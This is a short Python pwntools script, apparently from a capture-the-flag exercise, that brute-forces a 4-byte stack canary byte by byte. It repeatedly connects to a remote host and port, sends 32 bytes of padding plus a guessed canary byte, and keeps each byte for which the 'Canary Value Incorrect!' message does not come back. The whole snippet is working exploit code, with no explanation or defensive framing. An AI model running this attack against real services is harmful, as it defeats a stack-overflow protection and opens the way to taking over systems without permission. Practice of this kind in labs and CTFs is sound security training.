canary = b''
for i in range(4):
    for j in range(0x100):
        io = remote(host, port)
        io.sendlineafter(b'>', b'200')
        payload = b'a' * 0x20 + canary + p8(j)
        io.sendafter('$ ', payload)
        ans = str(io.recv())
        if "Canary Value Incorrect!" not in ans:
            canary += p8(j)
            print(f"NO:{i + 1}  {hex(j)}")
            break
        else:
            print(f"try again! {i}:{j}")
print(f"canary: {hex(u32(canary))}")
